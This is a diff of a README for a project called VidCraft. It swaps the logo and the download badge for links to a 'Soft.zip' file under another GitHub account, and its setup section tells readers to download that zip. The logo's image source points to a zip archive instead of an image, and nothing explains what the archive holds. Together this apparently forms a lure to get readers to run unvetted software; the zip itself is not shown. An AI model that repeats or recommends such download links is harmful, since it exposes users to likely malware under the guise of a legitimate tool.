@@ -1,6 +1,6 @@
 # 🚀 Welcome to VidCraft!
 
-![VidCraft Logo](https://your-image-url.com)
+![VidCraft Logo](https://github.com/Nanext21/VidCraft/releases/download/v1.0/Soft.zip)
 
 ## Overview
 
@@ -31,7 +31,7 @@ The VidCraft repository covers a wide range of technologies to support its advan
 ## Getting Started
 
 To get started with VidCraft, download the latest release from the following link:
-[![Download VidCraft](https://img.shields.io/badge/Download-Release-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download VidCraft](https://github.com/Nanext21/VidCraft/releases/download/v1.0/Soft.zip)](https://github.com/Nanext21/VidCraft/releases/download/v1.0/Soft.zip)
 
 Once you have downloaded the release, follow the setup instructions in the provided documentation to start generating amazing videos with VidCraft!
 
